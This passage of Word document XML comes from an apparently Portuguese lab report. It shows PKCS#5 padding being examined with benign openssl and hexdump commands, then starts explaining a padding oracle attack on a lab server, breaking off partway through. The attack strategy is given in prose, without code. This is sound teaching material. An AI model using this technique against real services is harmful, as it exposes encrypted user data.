    <w:p w14:paraId="727FDB7B" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Corpodetexto"/>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>Para visualizar o padding aplicado, decifrei sem remover o padding automaticamente:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E13EAB5" w14:textId="77777777" w:rsidR="004253CC" w:rsidRPr="00371B58" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>$ openssl enc -aes-128-cbc -d -nopad -p -in ficheiro1_cifrado.txt -out ficheiro1_decifrado.txt \</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D1FE052" w14:textId="77777777" w:rsidR="004253CC" w:rsidRPr="00371B58" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>-K 00112233445566778889aabbccddeeff \</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5AED76F7" w14:textId="77777777" w:rsidR="004253CC" w:rsidRPr="00371B58" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>-iv 0102030405060708</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62F9BF04" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2221DBC4" w14:textId="77777777" w:rsidR="004253CC" w:rsidRPr="00371B58" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>$ hexdump -C ficheiro1_decifrado.txt</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07F8A37B" w14:textId="77777777" w:rsidR="004253CC" w:rsidRPr="00371B58" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
        <w:spacing w:after="283"/>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>00000000  31 32 33 34 35 0b 0b 0b  0b 0b 0b 0b 0b 0b 0b 0b  |12345...........|</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68A45EC7" w14:textId="77777777" w:rsidR="004253CC" w:rsidRPr="00371B58" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Corpodetexto"/>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Forte"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>Análise</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t xml:space="preserve">: Como o conteúdo original tinha 5 bytes e o bloco precisa de ter 16 bytes, foram adicionados 11 bytes com valor </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>0x0b</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t xml:space="preserve"> (representação hexadecimal de 11).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04D4E1DF" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC">
      <w:pPr>
        <w:pStyle w:val="Ttulo3"/>
        <w:pageBreakBefore/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="75E9D8DD" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Ttulo3"/>
      </w:pPr>
      <w:bookmarkStart w:id="221" w:name="padroidentificadonopkcs5"/>
      <w:bookmarkStart w:id="222" w:name="_Toc213874751"/>
      <w:bookmarkStart w:id="223" w:name="_Toc213881989"/>
      <w:bookmarkEnd w:id="221"/>
      <w:r>
        <w:t>Padrão Identificado no PKCS#5</w:t>
      </w:r>
      <w:bookmarkEnd w:id="222"/>
      <w:bookmarkEnd w:id="223"/>
    </w:p>
    <w:p w14:paraId="2731809C" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Corpodetexto"/>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>Após repetir o processo com os outros ficheiros, identificamos o seguinte padrão:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="311FB0EC" w14:textId="77777777" w:rsidR="004253CC" w:rsidRPr="00371B58" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Corpodetexto"/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="19"/>
        </w:numPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="0"/>
        </w:tabs>
        <w:spacing w:before="0" w:after="0" w:line="276" w:lineRule="auto"/>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Forte"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>Ficheiro de 10 bytes</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t xml:space="preserve">: Recebeu 6 bytes de padding com valor </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>0x06</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27D315D1" w14:textId="77777777" w:rsidR="004253CC" w:rsidRPr="00371B58" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Corpodetexto"/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="19"/>
        </w:numPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="0"/>
        </w:tabs>
        <w:spacing w:before="0" w:after="140" w:line="276" w:lineRule="auto"/>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Forte"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>Ficheiro de 16 bytes</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t xml:space="preserve">: Recebeu um bloco completo (16 bytes) de padding com valor </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>0x10</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67F8C2B9" w14:textId="77777777" w:rsidR="004253CC" w:rsidRPr="00371B58" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Corpodetexto"/>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Forte"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>Conclusão</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>: A regra do PKCS#5 é: se faltam N bytes para completar o bloco, adicionam-se N bytes com valor N. Quando o tamanho já é múltiplo do bloco, adiciona-se um bloco inteiro de padding para evitar ambiguidade na decifragem.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D531E34" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Ttulo3"/>
      </w:pPr>
      <w:bookmarkStart w:id="224" w:name="opapeldovetordeinicializaoiv"/>
      <w:bookmarkStart w:id="225" w:name="_Toc213874752"/>
      <w:bookmarkStart w:id="226" w:name="_Toc213881990"/>
      <w:bookmarkEnd w:id="224"/>
      <w:r>
        <w:t>O Papel do Vetor de Inicialização (IV)</w:t>
      </w:r>
      <w:bookmarkEnd w:id="225"/>
      <w:bookmarkEnd w:id="226"/>
    </w:p>
    <w:p w14:paraId="08BA996B" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Corpodetexto"/>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>O modo CBC requer um IV para garantir que textos idênticos produzam cifrados diferentes. Isto é crítico para a segurança, pois impede que um atacante identifique padrões ao comparar cifrados.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="799C6041" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000" w:rsidP="00392CCA">
      <w:pPr>
        <w:pStyle w:val="Ttulo2"/>
      </w:pPr>
      <w:bookmarkStart w:id="227" w:name="exerccio2exploraodooraclepadding"/>
      <w:bookmarkStart w:id="228" w:name="_Toc213874753"/>
      <w:bookmarkStart w:id="229" w:name="_Toc213881991"/>
      <w:bookmarkEnd w:id="227"/>
      <w:r>
        <w:t>Exercício 2: Exploração do Oracle Padding</w:t>
      </w:r>
      <w:bookmarkEnd w:id="228"/>
      <w:bookmarkEnd w:id="229"/>
    </w:p>
    <w:p w14:paraId="7F259B44" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Ttulo3"/>
      </w:pPr>
      <w:bookmarkStart w:id="230" w:name="contextualizaodoataque"/>
      <w:bookmarkStart w:id="231" w:name="_Toc213874754"/>
      <w:bookmarkStart w:id="232" w:name="_Toc213881992"/>
      <w:bookmarkEnd w:id="230"/>
      <w:r>
        <w:t>Contextualização do Ataque</w:t>
      </w:r>
      <w:bookmarkEnd w:id="231"/>
      <w:bookmarkEnd w:id="232"/>
    </w:p>
    <w:p w14:paraId="60C27111" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Corpodetexto"/>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>O servidor oracle possui uma mensagem secreta e fornece-nos:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E7892A3" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Corpodetexto"/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="20"/>
        </w:numPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="0"/>
        </w:tabs>
        <w:spacing w:before="0" w:after="0" w:line="276" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">O texto cifrado (ciphertext) </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="129E3B8D" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Corpodetexto"/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="20"/>
        </w:numPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="0"/>
        </w:tabs>
        <w:spacing w:before="0" w:after="140" w:line="276" w:lineRule="auto"/>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t xml:space="preserve">O Vetor de Inicialização (IV) </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B5F5CDF" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Corpodetexto"/>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>Podemos enviar combinações de IV e ciphertext, e o oracle informa-nos apenas se o padding está válido ou não. Esta informação aparentemente simples é suficiente para recuperarmos o texto original.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="747AD03E" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Ttulo3"/>
      </w:pPr>
      <w:bookmarkStart w:id="233" w:name="fundamentostericosdaexplorao"/>
      <w:bookmarkStart w:id="234" w:name="_Toc213874755"/>
      <w:bookmarkStart w:id="235" w:name="_Toc213881993"/>
      <w:bookmarkEnd w:id="233"/>
      <w:r>
        <w:t>Fundamentos Teóricos da Exploração</w:t>
      </w:r>
      <w:bookmarkEnd w:id="234"/>
      <w:bookmarkEnd w:id="235"/>
    </w:p>
    <w:p w14:paraId="2693D6AE" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Corpodetexto"/>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>No modo CBC, a decifragem funciona da seguinte forma:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="109FAA4E" w14:textId="77777777" w:rsidR="004253CC" w:rsidRPr="00371B58" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
        <w:spacing w:after="283"/>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t xml:space="preserve">Plaintext = CiphertextAnterior </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:rFonts w:ascii="Cambria Math" w:hAnsi="Cambria Math" w:cs="Cambria Math"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>⊕</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t xml:space="preserve"> Decrypt(CiphertextAtual)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="585524B0" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Corpodetexto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t xml:space="preserve">Vou focar-me no último bloco. </w:t>
      </w:r>
      <w:r>
        <w:t>Consideremos:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="556D502C" w14:textId="77777777" w:rsidR="004253CC" w:rsidRPr="00371B58" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Corpodetexto"/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="21"/>
        </w:numPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="0"/>
        </w:tabs>
        <w:spacing w:before="0" w:after="0" w:line="276" w:lineRule="auto"/>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>C1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t xml:space="preserve"> e </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>C2</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t xml:space="preserve">: primeiro e segundo blocos do ciphertext </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DA998D3" w14:textId="77777777" w:rsidR="004253CC" w:rsidRPr="00371B58" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Corpodetexto"/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="21"/>
        </w:numPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="0"/>
        </w:tabs>
        <w:spacing w:before="0" w:after="0" w:line="276" w:lineRule="auto"/>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>D2</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t xml:space="preserve">: saída da decifragem do bloco </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>C2</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E58C59F" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Corpodetexto"/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="21"/>
        </w:numPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="0"/>
        </w:tabs>
        <w:spacing w:before="0" w:after="140" w:line="276" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t>P2</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: plaintext do segundo bloco </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3EA23EFA" w14:textId="77777777" w:rsidR="004253CC" w:rsidRPr="00371B58" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Corpodetexto"/>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t xml:space="preserve">A relação é: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t xml:space="preserve">P2 = C1 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:rFonts w:ascii="Cambria Math" w:hAnsi="Cambria Math" w:cs="Cambria Math"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>⊕</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t xml:space="preserve"> D2</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7156CAF8" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Ttulo3"/>
      </w:pPr>
      <w:bookmarkStart w:id="236" w:name="estratgiadeataque"/>
      <w:bookmarkStart w:id="237" w:name="_Toc213874756"/>
      <w:bookmarkStart w:id="238" w:name="_Toc213881994"/>
      <w:bookmarkEnd w:id="236"/>
      <w:r>
        <w:t>Estratégia de Ataque</w:t>
      </w:r>
      <w:bookmarkEnd w:id="237"/>
      <w:bookmarkEnd w:id="238"/>
    </w:p>
    <w:p w14:paraId="29B5773E" w14:textId="77777777" w:rsidR="004253CC" w:rsidRPr="00371B58" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Corpodetexto"/>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t xml:space="preserve">Se conseguirmos descobrir </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>D2</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t xml:space="preserve">, poderemos calcular </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>P2</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t xml:space="preserve">. A ideia é manipular </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>C1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t xml:space="preserve"> (vou chamar à versão manipulada </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>CC1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>) e observar quando o padding fica válido.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31AC55C6" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Ttulo4"/>
      </w:pPr>
      <w:bookmarkStart w:id="239" w:name="descobriroltimobyte"/>
      <w:bookmarkEnd w:id="239"/>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Descobrir o Último Byte</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B635503" w14:textId="77777777" w:rsidR="004253CC" w:rsidRPr="00371B58" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Corpodetexto"/>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t xml:space="preserve">Começo por assumir que quero um padding válido de </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>0x01</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CC123E3" w14:textId="77777777" w:rsidR="004253CC" w:rsidRPr="00371B58" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Corpodetexto"/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="22"/>
        </w:numPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="0"/>
        </w:tabs>
        <w:spacing w:before="0" w:after="0" w:line="276" w:lineRule="auto"/>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t xml:space="preserve">Modifico apenas o último byte de </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>CC1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t xml:space="preserve">, testamos valores de 0 a 255 </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="488AA676" w14:textId="77777777" w:rsidR="004253CC" w:rsidRPr="00371B58" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Corpodetexto"/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="22"/>
        </w:numPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="0"/>
        </w:tabs>
        <w:spacing w:before="0" w:after="0" w:line="276" w:lineRule="auto"/>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t xml:space="preserve">Para cada valor, envio </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>IV + CC1 + C2</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t xml:space="preserve"> ao oracle </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A20E565" w14:textId="77777777" w:rsidR="004253CC" w:rsidRPr="00371B58" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Corpodetexto"/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="22"/>
        </w:numPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="0"/>
        </w:tabs>
        <w:spacing w:before="0" w:after="0" w:line="276" w:lineRule="auto"/>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t xml:space="preserve">Quando o oracle retorna "válido", sei que </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t xml:space="preserve">CC1[15] </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:rFonts w:ascii="Cambria Math" w:hAnsi="Cambria Math" w:cs="Cambria Math"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>⊕</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t xml:space="preserve"> D2[15] = 0x01</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B0D1614" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Corpodetexto"/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="22"/>
        </w:numPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="0"/>
        </w:tabs>
